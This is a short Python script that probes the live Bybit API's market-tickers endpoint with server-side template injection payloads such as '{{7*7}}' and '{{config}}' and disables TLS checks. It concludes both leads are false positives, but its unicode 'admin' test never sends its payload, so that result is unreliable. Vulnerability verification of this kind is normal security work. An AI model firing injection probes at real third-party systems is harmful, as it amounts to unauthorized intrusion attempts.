#!/usr/bin/env python3
import requests
import json

BASE_URL = "https://api.bybit.com"
requests.packages.urllib3.disable_warnings()

print("="*80)
print("VERIFYING POTENTIAL SSTI")
print("="*80)

# Test SSTI properly
ssti_tests = [
    ("Normal", "BTCUSDT"),
    ("Math 7*7", "{{7*7}}"),
    ("Math 8*8", "#{8*8}"),
    ("String", "{{config}}"),
]

print("\n[1] Testing /v5/market/tickers endpoint")
print("-" * 80)

for name, payload in ssti_tests:
    try:
        r = requests.get(
            f"{BASE_URL}/v5/market/tickers",
            params={"symbol": payload, "category": "spot"},
            verify=False,
            timeout=3
        )
        
        data = r.json()
        
        print(f"\nTest: {name}")
        print(f"  Payload: {payload}")
        print(f"  RetCode: {data.get('retCode')}")
        print(f"  RetMsg: {data.get('retMsg')}")
        
        # Check if "49" or "64" appears in RESULT (not timestamp)
        result_str = json.dumps(data.get('result', {}))
        
        if payload == "{{7*7}}" and "49" in result_str:
            print(f"  🚨 SSTI CONFIRMED! Found '49' in result!")
        elif payload == "#{8*8}" and "64" in result_str:
            print(f"  🚨 SSTI CONFIRMED! Found '64' in result!")
        else:
            print(f"  ✅ No SSTI (result: {result_str[:100]})")
            
    except Exception as e:
        print(f"  Error: {e}")

# Test unicode normalization properly
print("\n\n[2] Testing Unicode Normalization")
print("-" * 80)

unicode_tests = [
    ("Normal admin", "admin"),
    ("Fullwidth", "ａｄｍｉｎ"),
    ("Zero-width", "admin\u200b"),
]

for name, payload in unicode_tests:
    try:
        r = requests.get(
            f"{BASE_URL}/v5/user/query-api",
            verify=False,
            timeout=3
        )
        
        print(f"\nTest: {name}")
        print(f"  Status: {r.status_code}")
        
        try:
            data = r.json()
            print(f"  RetCode: {data.get('retCode')}")
            print(f"  RetMsg: {data.get('retMsg')}")
        except:
            print(f"  Response: {r.text[:100]}")
            
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "="*80)
print("VERDICT: Both are likely FALSE POSITIVES")
print("- SSTI: '49' was in timestamp, not evaluated")
print("- Unicode: All return same 200 (endpoint exists)")
print("="*80)
